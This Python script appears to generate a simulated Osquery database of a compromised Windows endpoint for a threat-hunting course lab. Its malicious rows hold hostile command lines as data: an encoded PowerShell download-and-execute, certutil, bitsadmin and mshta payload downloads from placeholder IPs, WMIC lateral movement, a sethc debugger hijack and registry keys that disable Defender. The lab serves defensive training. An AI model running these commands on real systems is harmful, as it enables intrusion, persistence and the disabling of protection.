#!/usr/bin/env python3
"""
generate_osquery_db.py - Genera base de datos SQLite simulando tablas de Osquery
con endpoint comprometido para hunting.
Incluye 12 tablas con datos realistas y múltiples indicadores de compromiso.
Curso MAR404 - Clase 9 - Lab 17
"""
import sqlite3
import hashlib
import random
import time
import json

DB_PATH = "/app/osquery.db"

def main():
    import os
    if os.path.exists(DB_PATH):
        os.remove(DB_PATH)
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()

    # =========================================================================
    # TABLE 1: processes - Procesos activos en el sistema
    # =========================================================================
    c.execute("""CREATE TABLE IF NOT EXISTS processes (
        pid INTEGER PRIMARY KEY, name TEXT, path TEXT, cmdline TEXT,
        parent INTEGER, uid INTEGER, gid INTEGER,
        start_time INTEGER, resident_size INTEGER,
        is_elevated INTEGER DEFAULT 0, threads INTEGER DEFAULT 1,
        nice INTEGER DEFAULT 0, state TEXT DEFAULT 'R'
    )""")

    base_time = 1721462400  # 2024-07-20 00:00:00 UTC

    normal_procs = [
        (4, "System", "", "", 0, 0, 0, base_time, 1024, 1, 120, 0, "R"),
        (88, "Registry", "", "", 4, 0, 0, base_time+1, 512, 1, 4, 0, "R"),
        (400, "smss.exe", r"C:\Windows\System32\smss.exe", "smss.exe", 4, 0, 0, base_time+2, 1024, 1, 2, 0, "R"),
        (500, "csrss.exe", r"C:\Windows\System32\csrss.exe", r"\??\C:\Windows\system32\csrss.exe ObjectDirectory=\Windows", 400, 0, 0, base_time+3, 4096, 1, 12, 0, "R"),
        (600, "csrss.exe", r"C:\Windows\System32\csrss.exe", r"\??\C:\Windows\system32\csrss.exe ObjectDirectory=\Windows", 400, 0, 0, base_time+4, 3584, 1, 14, 0, "R"),
        (700, "wininit.exe", r"C:\Windows\System32\wininit.exe", "wininit.exe", 400, 0, 0, base_time+5, 2048, 1, 3, 0, "R"),
        (720, "winlogon.exe", r"C:\Windows\System32\winlogon.exe", "winlogon.exe", 400, 0, 0, base_time+6, 4096, 1, 5, 0, "R"),
        (800, "services.exe", r"C:\Windows\System32\services.exe", "services.exe", 700, 0, 0, base_time+7, 8192, 1, 8, 0, "R"),
        (900, "lsass.exe", r"C:\Windows\System32\lsass.exe", "lsass.exe", 700, 0, 0, base_time+8, 16384, 1, 10, 0, "R"),
        (1000, "svchost.exe", r"C:\Windows\System32\svchost.exe", "svchost.exe -k netsvcs -p", 800, 0, 0, base_time+10, 32768, 1, 25, 0, "R"),
        (1100, "svchost.exe", r"C:\Windows\System32\svchost.exe", "svchost.exe -k LocalService -p", 800, 0, 0, base_time+11, 16384, 1, 15, 0, "R"),
        (1200, "svchost.exe", r"C:\Windows\System32\svchost.exe", "svchost.exe -k LocalSystemNetworkRestricted -p", 800, 0, 0, base_time+12, 24576, 1, 20, 0, "R"),
        (1300, "svchost.exe", r"C:\Windows\System32\svchost.exe", "svchost.exe -k NetworkService -p", 800, 0, 0, base_time+13, 12288, 1, 12, 0, "R"),
        (1500, "spoolsv.exe", r"C:\Windows\System32\spoolsv.exe", "spoolsv.exe", 800, 0, 0, base_time+15, 8192, 1, 7, 0, "R"),
        (1700, "MsMpEng.exe", r"C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.2304.8-0\MsMpEng.exe", "MsMpEng.exe", 800, 0, 0, base_time+17, 131072, 1, 30, 0, "R"),
        (2000, "dwm.exe", r"C:\Windows\System32\dwm.exe", "dwm.exe", 720, 0, 0, base_time+20, 65536, 1, 15, 0, "R"),
        (2400, "explorer.exe", r"C:\Windows\explorer.exe", r"C:\Windows\Explorer.EXE", 2380, 1001, 1001, base_time+100, 98304, 0, 45, 0, "R"),
        (3000, "chrome.exe", r"C:\Program Files\Google\Chrome\Application\chrome.exe", "chrome.exe --type=browser", 2400, 1001, 1001, base_time+500, 262144, 0, 35, 0, "R"),
        (3100, "chrome.exe", r"C:\Program Files\Google\Chrome\Application\chrome.exe", "chrome.exe --type=renderer --field-trial-handle=1234", 3000, 1001, 1001, base_time+501, 131072, 0, 10, 0, "R"),
        (3200, "chrome.exe", r"C:\Program Files\Google\Chrome\Application\chrome.exe", "chrome.exe --type=gpu-process", 3000, 1001, 1001, base_time+502, 65536, 0, 8, 0, "R"),
        (3500, "OUTLOOK.EXE", r"C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE", "OUTLOOK.EXE", 2400, 1001, 1001, base_time+600, 196608, 0, 40, 0, "R"),
        (3700, "Teams.exe", r"C:\Users\analyst01\AppData\Local\Microsoft\Teams\current\Teams.exe", "Teams.exe", 2400, 1001, 1001, base_time+700, 262144, 0, 50, 0, "R"),
        (4000, "OneDrive.exe", r"C:\Users\analyst01\AppData\Local\Microsoft\OneDrive\OneDrive.exe", "OneDrive.exe /background", 2400, 1001, 1001, base_time+800, 65536, 0, 12, 0, "R"),
        (4200, "SearchHost.exe", r"C:\Windows\SystemApps\MicrosoftWindows.Client.CBS_cw5n1h2txyewy\SearchHost.exe", "SearchHost.exe", 1000, 0, 0, base_time+900, 131072, 0, 25, 0, "R"),
        (4500, "RuntimeBroker.exe", r"C:\Windows\System32\RuntimeBroker.exe", "RuntimeBroker.exe -Embedding", 1000, 1001, 1001, base_time+1000, 16384, 0, 5, 0, "R"),
    ]

    # === PROCESOS MALICIOSOS (múltiples escenarios) ===
    malicious_procs = [
        # Escenario 1: Masquerading - svchost.exe desde path incorrecto
        (7788, "svchost.exe", r"C:\Users\Public\svchost.exe", "svchost.exe -k netsvcs", 2400, 1001, 1001, base_time+18000, 45056, 0, 3, 0, "R"),
        # Escenario 2: PowerShell encoded (hijo del falso svchost)
        (8100, "powershell.exe", r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe", "powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADgALgA1ADEALgAxADAAMAAuADEAMAAvAHMAaABlAGwAbAAnACkA", 7788, 0, 0, base_time+18100, 78000, 1, 8, 0, "R"),
        # Escenario 3: rundll32 cargando DLL maliciosa
        (8500, "rundll32.exe", r"C:\Windows\System32\rundll32.exe", r"rundll32.exe C:\Windows\Temp\update.dll,DllMain", 8100, 0, 0, base_time+18200, 32000, 1, 4, 0, "R"),
        # Escenario 4: cmd.exe para reconocimiento
        (9000, "cmd.exe", r"C:\Windows\System32\cmd.exe", r"cmd.exe /c whoami /all > C:\Windows\Temp\info.txt", 8100, 0, 0, base_time+18300, 4096, 1, 1, 0, "S"),
        # Escenario 5: Segundo lsass.exe (credential dumping fake)
        (9200, "lsass.exe", r"C:\Windows\Temp\lsass.exe", "lsass.exe", 8100, 0, 0, base_time+18400, 8192, 1, 2, 0, "R"),
        # Escenario 6: certutil para descarga
        (9400, "certutil.exe", r"C:\Windows\System32\certutil.exe", "certutil.exe -urlcache -split -f http://198.51.100.10/beacon.exe C:\\Windows\\Temp\\beacon.exe", 8100, 0, 0, base_time+18500, 4096, 1, 2, 0, "S"),
        # Escenario 7: mshta para ejecución de HTA
        (9600, "mshta.exe", r"C:\Windows\System32\mshta.exe", "mshta.exe http://198.51.100.10/payload.hta", 2400, 1001, 1001, base_time+18600, 16384, 0, 3, 0, "R"),
        # Escenario 8: notepad.exe con conexión de red (process hollowing)
        (9800, "notepad.exe", r"C:\Windows\System32\notepad.exe", "notepad.exe", 8100, 0, 0, base_time+18700, 65536, 1, 6, 0, "R"),
        # Escenario 9: wmic para ejecución remota
        (10000, "WMIC.exe", r"C:\Windows\System32\wbem\WMIC.exe", "wmic /node:10.0.1.100 process call create \"cmd.exe /c powershell -ep bypass -f \\\\10.0.1.50\\share\\payload.ps1\"", 8100, 0, 0, base_time+18800, 8192, 1, 2, 0, "S"),
        # Escenario 10: bitsadmin para descarga persistente
        (10200, "bitsadmin.exe", r"C:\Windows\System32\bitsadmin.exe", "bitsadmin /transfer evil /download /priority high http://203.0.113.50/implant.exe C:\\Users\\Public\\updater.exe", 8100, 0, 0, base_time+18900, 4096, 1, 2, 0, "S"),
    ]

    for p in normal_procs + malicious_procs:
        c.execute("INSERT INTO processes VALUES (?,?,?,?,?,?,?,?,?,?,?,?,?)", p)

    # =========================================================================
    # TABLE 2: process_open_sockets - Conexiones de red activas
    # =========================================================================
    c.execute("""CREATE TABLE IF NOT EXISTS process_open_sockets (
        pid INTEGER, fd INTEGER, socket INTEGER, family INTEGER,
        protocol INTEGER, local_address TEXT, local_port INTEGER,
        remote_address TEXT, remote_port INTEGER, state TEXT
    )""")

    normal_sockets = [
        (3000, 5, 100, 2, 6, "10.0.1.50", 49800, "142.250.80.46", 443, "ESTABLISHED"),
        (3100, 6, 101, 2, 6, "10.0.1.50", 49801, "142.250.80.46", 443, "ESTABLISHED"),
        (3500, 7, 102, 2, 6, "10.0.1.50", 49802, "52.96.166.130", 443, "ESTABLISHED"),
        (3700, 8, 103, 2, 6, "10.0.1.50", 49803, "52.113.194.132", 443, "ESTABLISHED"),
        (4000, 9, 104, 2, 6, "10.0.1.50", 49804, "13.107.42.16", 443, "ESTABLISHED"),
        (1000, 10, 105, 2, 6, "10.0.1.50", 49805, "10.0.1.1", 53, "ESTABLISHED"),
        (1300, 11, 106, 2, 17, "10.0.1.50", 68, "10.0.1.1", 67, "ESTABLISHED"),
        (1700, 12, 107, 2, 6, "10.0.1.50", 49806, "20.189.173.1", 443, "ESTABLISHED"),
    ]

    malicious_sockets = [
        # svchost falso → C2 principal
        (7788, 20, 200, 2, 6, "10.0.1.50", 49900, "198.51.100.10", 443, "ESTABLISHED"),
        # PowerShell → C2 secundario
        (8100, 21, 201, 2, 6, "10.0.1.50", 49901, "198.51.100.10", 8443, "ESTABLISHED"),
        # rundll32 → C2 para exfiltración
        (8500, 22, 202, 2, 6, "10.0.1.50", 49902, "203.0.113.50", 4444, "ESTABLISHED"),
        # notepad (hollowed) → C2 beacon
        (9800, 23, 203, 2, 6, "10.0.1.50", 49903, "198.51.100.10", 443, "ESTABLISHED"),
        # mshta → descarga payload
        (9600, 24, 204, 2, 6, "10.0.1.50", 49904, "198.51.100.10", 80, "CLOSE_WAIT"),
        # WMIC → lateral movement
        (10000, 25, 205, 2, 6, "10.0.1.50", 49905, "10.0.1.100", 135, "ESTABLISHED"),
        (10000, 26, 206, 2, 6, "10.0.1.50", 49906, "10.0.1.100", 445, "ESTABLISHED"),
    ]

    for s in normal_sockets + malicious_sockets:
        c.execute("INSERT INTO process_open_sockets VALUES (?,?,?,?,?,?,?,?,?,?)", s)

    # =========================================================================
    # TABLE 3: scheduled_tasks - Tareas programadas
    # =========================================================================
    c.execute("""CREATE TABLE IF NOT EXISTS scheduled_tasks (
        name TEXT, action TEXT, path TEXT, enabled INTEGER,
        last_run_time INTEGER, next_run_time INTEGER, hidden INTEGER,
        username TEXT DEFAULT 'SYSTEM'
    )""")

    tasks = [
        ("GoogleUpdateTaskMachine", r"C:\Program Files\Google\Update\GoogleUpdate.exe /c", "\\Google\\Update", 1, base_time, base_time+86400, 0, "SYSTEM"),
        ("MicrosoftEdgeUpdate", r"C:\Program Files\Microsoft\EdgeUpdate\MicrosoftEdgeUpdate.exe /ua", "\\Microsoft\\EdgeUpdate", 1, base_time, base_time+86400, 0, "SYSTEM"),
        ("OneDrive Standalone Update", r"C:\Users\analyst01\AppData\Local\Microsoft\OneDrive\OneDriveStandaloneUpdater.exe", "\\OneDrive", 1, base_time, base_time+86400, 0, "analyst01"),
        # MALICIOSO: Tarea oculta que ejecuta el implant
        ("WindowsDefenderUpdate", r"C:\Users\Public\svchost.exe -k netsvcs", r"\Microsoft\Windows\Defender", 1, base_time+18000, base_time+21600, 1, "SYSTEM"),
        # MALICIOSO: Tarea con nombre legítimo pero path sospechoso
        ("SystemHealthCheck", r"powershell.exe -ep bypass -f C:\Windows\Temp\health.ps1", r"\Microsoft\Windows\Maintenance", 1, base_time+18100, base_time+19800, 0, "SYSTEM"),
    ]

    for t in tasks:
        c.execute("INSERT INTO scheduled_tasks VALUES (?,?,?,?,?,?,?,?)", t)

    # =========================================================================
    # TABLE 4: startup_items - Items de inicio (persistencia)
    # =========================================================================
    c.execute("""CREATE TABLE IF NOT EXISTS startup_items (
        name TEXT, path TEXT, source TEXT, status TEXT, username TEXT
    )""")

    startups = [
        ("SecurityHealth", r"C:\Windows\System32\SecurityHealthSystray.exe", "registry_run", "enabled", "SYSTEM"),
        ("OneDrive", r"C:\Users\analyst01\AppData\Local\Microsoft\OneDrive\OneDrive.exe /background", "registry_run", "enabled", "analyst01"),
        ("Teams", r"C:\Users\analyst01\AppData\Local\Microsoft\Teams\Update.exe --processStart Teams.exe", "registry_run", "enabled", "analyst01"),
        ("iTunesHelper", r"C:\Program Files\iTunes\iTunesHelper.exe", "registry_run", "enabled", "analyst01"),
        # MALICIOSO: Persistencia del implant
        ("WindowsUpdate", r"C:\Users\Public\svchost.exe", "registry_run", "enabled", "SYSTEM"),
        # MALICIOSO: Persistencia via Run key
        ("MicrosoftEdgeAutoUpdate", r"rundll32.exe C:\Windows\Temp\update.dll,DllMain", "registry_run", "enabled", "SYSTEM"),
    ]

    for s in startups:
        c.execute("INSERT INTO startup_items VALUES (?,?,?,?,?)", s)

    # =========================================================================
    # TABLE 5: listening_ports - Puertos en escucha
    # =========================================================================
    c.execute("""CREATE TABLE IF NOT EXISTS listening_ports (
        pid INTEGER, port INTEGER, protocol INTEGER, address TEXT, family INTEGER DEFAULT 2
    )""")

    ports = [
        (1000, 135, 6, "0.0.0.0", 2),
        (1200, 445, 6, "0.0.0.0", 2),
        (1200, 139, 6, "0.0.0.0", 2),
        (4, 49664, 6, "0.0.0.0", 2),
        (800, 49665, 6, "0.0.0.0", 2),
        (1500, 49666, 6, "0.0.0.0", 2),
        # MALICIOSO: Reverse shell listener
        (8500, 4444, 6, "0.0.0.0", 2),
        # MALICIOSO: Proxy SOCKS
        (7788, 1080, 6, "127.0.0.1", 2),
    ]

    for p in ports:
        c.execute("INSERT INTO listening_ports VALUES (?,?,?,?,?)", p)

    # =========================================================================
    # TABLE 6: hash - Hashes de archivos del sistema
    # =========================================================================
    c.execute("""CREATE TABLE IF NOT EXISTS hash (
        path TEXT, md5 TEXT, sha256 TEXT, sha1 TEXT DEFAULT ''
    )""")

    hashes = [
        (r"C:\Windows\System32\svchost.exe", "3a5b1c2d4e6f7890", hashlib.sha256(b"legit_svchost_v10").hexdigest(), hashlib.sha1(b"legit_svchost_v10").hexdigest()),
        (r"C:\Windows\System32\cmd.exe", "1234567890abcdef", hashlib.sha256(b"legit_cmd").hexdigest(), hashlib.sha1(b"legit_cmd").hexdigest()),
        (r"C:\Windows\System32\powershell.exe", "abcdef1234567890", hashlib.sha256(b"legit_powershell").hexdigest(), hashlib.sha1(b"legit_powershell").hexdigest()),
        (r"C:\Windows\System32\rundll32.exe", "fedcba0987654321", hashlib.sha256(b"legit_rundll32").hexdigest(), hashlib.sha1(b"legit_rundll32").hexdigest()),
        # MALICIOSO: svchost falso con hash diferente
        (r"C:\Users\Public\svchost.exe", "deadbeefcafebabe", hashlib.sha256(b"cobalt_strike_beacon_v4.9").hexdigest(), hashlib.sha1(b"cobalt_strike_beacon_v4.9").hexdigest()),
        # MALICIOSO: DLL maliciosa
        (r"C:\Windows\Temp\update.dll", "1337c0de1337c0de", hashlib.sha256(b"meterpreter_reverse_tcp").hexdigest(), hashlib.sha1(b"meterpreter_reverse_tcp").hexdigest()),
        # MALICIOSO: Beacon descargado
        (r"C:\Users\Public\updater.exe", "b4dc0ffee0b4dc0f", hashlib.sha256(b"sliver_implant_v1.5").hexdigest(), hashlib.sha1(b"sliver_implant_v1.5").hexdigest()),
        # MALICIOSO: Script de persistencia
        (r"C:\Windows\Temp\health.ps1", "5c71p7h45h000000", hashlib.sha256(b"persistence_script").hexdigest(), hashlib.sha1(b"persistence_script").hexdigest()),
    ]

    for h in hashes:
        c.execute("INSERT INTO hash VALUES (?,?,?,?)", h)

    # =========================================================================
    # TABLE 7: file_events - Eventos de cambio en filesystem (NUEVA)
    # =========================================================================
    c.execute("""CREATE TABLE IF NOT EXISTS file_events (
        target_path TEXT, category TEXT, action TEXT, md5 TEXT,
        sha256 TEXT, time INTEGER, size INTEGER, uid INTEGER,
        process_pid INTEGER DEFAULT 0
    )""")

    file_events = [
        # Eventos normales
        (r"C:\Users\analyst01\Documents\report.docx", "documents", "UPDATED", "", "", base_time+1000, 45000, 1001, 3500),
        (r"C:\Users\analyst01\Downloads\presentation.pptx", "downloads", "CREATED", "", "", base_time+2000, 2500000, 1001, 3000),
        # MALICIOSO: Creación de archivos sospechosos
        (r"C:\Users\Public\svchost.exe", "suspicious", "CREATED", "deadbeefcafebabe", hashlib.sha256(b"cobalt_strike_beacon_v4.9").hexdigest(), base_time+17900, 287744, 0, 8100),
        (r"C:\Windows\Temp\update.dll", "temp", "CREATED", "1337c0de1337c0de", hashlib.sha256(b"meterpreter_reverse_tcp").hexdigest(), base_time+18150, 65536, 0, 8100),
        (r"C:\Windows\Temp\info.txt", "temp", "CREATED", "", "", base_time+18350, 2048, 0, 9000),
        (r"C:\Windows\Temp\health.ps1", "temp", "CREATED", "5c71p7h45h000000", hashlib.sha256(b"persistence_script").hexdigest(), base_time+18050, 4096, 0, 8100),
        (r"C:\Users\Public\updater.exe", "suspicious", "CREATED", "b4dc0ffee0b4dc0f", hashlib.sha256(b"sliver_implant_v1.5").hexdigest(), base_time+18950, 524288, 0, 10200),
        # MALICIOSO: Ransomware simulation - archivos cifrados
        (r"C:\Users\analyst01\Documents\budget.xlsx.encrypted", "documents", "CREATED", "", "", base_time+20000, 48000, 0, 0),
        (r"C:\Users\analyst01\Documents\passwords.kdbx.encrypted", "documents", "CREATED", "", "", base_time+20001, 12000, 0, 0),
        (r"C:\Users\analyst01\Pictures\family.jpg.encrypted", "pictures", "CREATED", "", "", base_time+20002, 3500000, 0, 0),
    ]

    for f in file_events:
        c.execute("INSERT INTO file_events VALUES (?,?,?,?,?,?,?,?,?)", f)

    # =========================================================================
    # TABLE 8: registry - Claves de registro (NUEVA)
    # =========================================================================
    c.execute("""CREATE TABLE IF NOT EXISTS registry (
        path TEXT, name TEXT, type TEXT, data TEXT, mtime INTEGER
    )""")

    registry_entries = [
        # Normales
        (r"HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run", "SecurityHealth", "REG_EXPAND_SZ", r"C:\Windows\System32\SecurityHealthSystray.exe", base_time),
        (r"HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run", "OneDrive", "REG_SZ", r'"C:\Users\analyst01\AppData\Local\Microsoft\OneDrive\OneDrive.exe" /background', base_time),
        (r"HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion", "ProductName", "REG_SZ", "Windows 10 Enterprise", base_time),
        (r"HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\WinDefend", "Start", "REG_DWORD", "2", base_time),
        # MALICIOSO: Persistencia en Run key
        (r"HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run", "WindowsUpdate", "REG_SZ", r"C:\Users\Public\svchost.exe", base_time+18000),
        (r"HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run", "MicrosoftEdgeAutoUpdate", "REG_SZ", r"rundll32.exe C:\Windows\Temp\update.dll,DllMain", base_time+18200),
        # MALICIOSO: Deshabilitación de Windows Defender
        (r"HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender", "DisableAntiSpyware", "REG_DWORD", "1", base_time+17800),
        (r"HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection", "DisableRealtimeMonitoring", "REG_DWORD", "1", base_time+17801),
        # MALICIOSO: Image File Execution Options (debugger hijack)
        (r"HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe", "Debugger", "REG_SZ", r"C:\Windows\System32\cmd.exe", base_time+18500),
    ]

    for r in registry_entries:
        c.execute("INSERT INTO registry VALUES (?,?,?,?,?)", r)

    # =========================================================================
    # TABLE 9: drivers - Drivers cargados (NUEVA)
    # =========================================================================
    c.execute("""CREATE TABLE IF NOT EXISTS drivers (
        name TEXT, path TEXT, version TEXT, description TEXT,
        signed INTEGER, manufacturer TEXT
    )""")

    drivers = [
        ("ntfs", r"C:\Windows\System32\drivers\ntfs.sys", "10.0.19041.1", "NT File System", 1, "Microsoft Corporation"),
        ("tcpip", r"C:\Windows\System32\drivers\tcpip.sys", "10.0.19041.1", "TCP/IP Protocol Driver", 1, "Microsoft Corporation"),
        ("npcap", r"C:\Windows\System32\drivers\npcap.sys", "1.75.0", "Npcap Packet Driver", 1, "Nmap Project"),
        ("vmci", r"C:\Windows\System32\drivers\vmci.sys", "12.0.0.1", "VMware VMCI Bus Driver", 1, "VMware Inc."),
        # MALICIOSO: Driver sin firma (rootkit)
        ("WdFilter2", r"C:\Windows\System32\drivers\WdFilter2.sys", "1.0.0.0", "Windows Defender Mini-Filter Driver", 0, ""),
        # MALICIOSO: Driver con nombre similar a legítimo
        ("tcplp", r"C:\Windows\Temp\tcplp.sys", "1.0.0.0", "TCP/IP Helper", 0, "Unknown"),
    ]

    for d in drivers:
        c.execute("INSERT INTO drivers VALUES (?,?,?,?,?,?)", d)

    # =========================================================================
    # TABLE 10: logged_in_users - Sesiones activas (NUEVA)
    # =========================================================================
    c.execute("""CREATE TABLE IF NOT EXISTS logged_in_users (
        type TEXT, user TEXT, host TEXT, time INTEGER, pid INTEGER, sid TEXT
    )""")

    users = [
        ("interactive", "analyst01", "WORKSTATION01", base_time+100, 2400, "S-1-5-21-1234567890-1234567890-1234567890-1001"),
        ("service", "SYSTEM", "WORKSTATION01", base_time, 800, "S-1-5-18"),
        ("service", "LOCAL SERVICE", "WORKSTATION01", base_time, 1100, "S-1-5-19"),
        ("service", "NETWORK SERVICE", "WORKSTATION01", base_time, 1300, "S-1-5-20"),
        # MALICIOSO: Sesión remota sospechosa
        ("remote", "admin", "10.0.1.200", base_time+17500, 0, "S-1-5-21-1234567890-1234567890-1234567890-500"),
    ]

    for u in users:
        c.execute("INSERT INTO logged_in_users VALUES (?,?,?,?,?,?)", u)

    # =========================================================================
    # TABLE 11: process_events - Log de eventos de procesos (NUEVA - para tiempo real)
    # =========================================================================
    c.execute("""CREATE TABLE IF NOT EXISTS process_events (
        pid INTEGER, path TEXT, cmdline TEXT, parent INTEGER,
        parent_path TEXT, action TEXT, time INTEGER,
        uid INTEGER, eid INTEGER PRIMARY KEY
    )""")

    # Eventos base que ya ocurrieron
    process_events = [
        (2400, r"C:\Windows\explorer.exe", "explorer.exe", 2380, r"C:\Windows\System32\userinit.exe", "exec", base_time+100, 1001, 1),
        (3000, r"C:\Program Files\Google\Chrome\Application\chrome.exe", "chrome.exe", 2400, r"C:\Windows\explorer.exe", "exec", base_time+500, 1001, 2),
        (3500, r"C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE", "OUTLOOK.EXE", 2400, r"C:\Windows\explorer.exe", "exec", base_time+600, 1001, 3),
        # MALICIOSO: Cadena de ejecución del ataque
        (7788, r"C:\Users\Public\svchost.exe", "svchost.exe -k netsvcs", 2400, r"C:\Windows\explorer.exe", "exec", base_time+18000, 1001, 100),
        (8100, r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe", "powershell.exe -nop -w hidden -enc SQBFAFgA...", 7788, r"C:\Users\Public\svchost.exe", "exec", base_time+18100, 0, 101),
        (8500, r"C:\Windows\System32\rundll32.exe", r"rundll32.exe C:\Windows\Temp\update.dll,DllMain", 8100, r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe", "exec", base_time+18200, 0, 102),
        (9000, r"C:\Windows\System32\cmd.exe", r"cmd.exe /c whoami /all > C:\Windows\Temp\info.txt", 8100, r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe", "exec", base_time+18300, 0, 103),
        (9200, r"C:\Windows\Temp\lsass.exe", "lsass.exe", 8100, r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe", "exec", base_time+18400, 0, 104),
        (9400, r"C:\Windows\System32\certutil.exe", "certutil.exe -urlcache -split -f http://198.51.100.10/beacon.exe C:\\Windows\\Temp\\beacon.exe", 8100, r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe", "exec", base_time+18500, 0, 105),
        (9600, r"C:\Windows\System32\mshta.exe", "mshta.exe http://198.51.100.10/payload.hta", 2400, r"C:\Windows\explorer.exe", "exec", base_time+18600, 1001, 106),
        (9800, r"C:\Windows\System32\notepad.exe", "notepad.exe", 8100, r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe", "exec", base_time+18700, 0, 107),
        (10000, r"C:\Windows\System32\wbem\WMIC.exe", "wmic /node:10.0.1.100 process call create ...", 8100, r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe", "exec", base_time+18800, 0, 108),
        (10200, r"C:\Windows\System32\bitsadmin.exe", "bitsadmin /transfer evil /download /priority high http://203.0.113.50/implant.exe C:\\Users\\Public\\updater.exe", 8100, r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe", "exec", base_time+18900, 0, 109),
    ]

    for pe in process_events:
        c.execute("INSERT INTO process_events VALUES (?,?,?,?,?,?,?,?,?)", pe)

    # =========================================================================
    # TABLE 12: dns_cache - Cache DNS del endpoint (NUEVA)
    # =========================================================================
    c.execute("""CREATE TABLE IF NOT EXISTS dns_cache (
        name TEXT, type TEXT, answer TEXT, ttl INTEGER, time_queried INTEGER
    )""")

    dns_entries = [
        ("www.google.com", "A", "142.250.80.46", 300, base_time+500),
        ("outlook.office365.com", "A", "52.96.166.130", 60, base_time+600),
        ("teams.microsoft.com", "A", "52.113.194.132", 60, base_time+700),
        ("onedrive.live.com", "A", "13.107.42.16", 300, base_time+800),
        ("windowsupdate.microsoft.com", "A", "20.189.173.1", 3600, base_time+900),
        # MALICIOSO: Dominios C2
        ("cdn-static-assets.evil-corp.net", "A", "198.51.100.10", 60, base_time+17900),
        ("api.update-service.xyz", "A", "203.0.113.50", 30, base_time+18150),
        # MALICIOSO: DGA domains
        ("xkjh7f2m9p.com", "A", "198.51.100.10", 60, base_time+19000),
        ("m3kf9x2lp7.net", "A", "198.51.100.10", 60, base_time+19100),
        ("q7w2e5r8t1.org", "A", "198.51.100.10", 60, base_time+19200),
    ]

    for d in dns_entries:
        c.execute("INSERT INTO dns_cache VALUES (?,?,?,?,?)", d)

    conn.commit()
    conn.close()
    print(f"[+] Osquery database generated: {DB_PATH}")
    print(f"[+] Tables: processes, process_open_sockets, scheduled_tasks, startup_items,")
    print(f"    listening_ports, hash, file_events, registry, drivers, logged_in_users,")
    print(f"    process_events, dns_cache")
    print(f"[+] Malicious indicators embedded in multiple tables")

if __name__ == "__main__":
    main()
